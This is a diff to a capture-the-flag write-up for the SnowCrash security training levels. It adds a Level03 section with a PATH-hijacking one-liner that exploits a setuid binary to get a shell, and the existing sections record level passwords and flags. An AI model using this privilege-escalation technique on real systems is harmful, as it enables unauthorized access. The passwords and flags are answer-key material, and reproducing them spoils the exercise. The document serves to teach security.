@@ -2,6 +2,7 @@
 This project aims to make you discover, through several little challenges, cyber security in various fields.
 
 ## Level00:
+
 ```bash
 level00@SnowCrash:~$ ls -l /usr/sbin/ | grep flag00
 ----r--r--  1 flag00  flag00      15 Mar  5  2016 john
@@ -20,6 +21,7 @@ Password for flag00: `nottoohardhere`
 Flag: `x24ti5gi3x0ol2eh4esiuxias`
 
 ## Level01:
+
 ```bash
 level01@SnowCrash:~$ cat /etc/passwd
 ...
@@ -85,3 +87,25 @@ Password for flag02: `ft_waNDReL0L`
 
 Flag: `kooda2puivaav1idi4f57q8iq`
 
+## Level03:
+
+```bash
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+level03@SnowCrash:~$ ./level03
+Exploit me
+level03@SnowCrash:~$
+```
+
+Disassembled:
+
+<img width="468" alt="image" src="https://user-images.githubusercontent.com/48088579/148961769-ff778941-e677-4280-b940-a7ffee264ccb.png">
+
+Exploit:
+
+```bash
+echo "/bin/bash" > /tmp/echo && chmod 777 /tmp/echo && export PATH=/tmp:$PATH && ./level03
+```
+
+Flag: qi0maab88jeaj46qoumi7maus
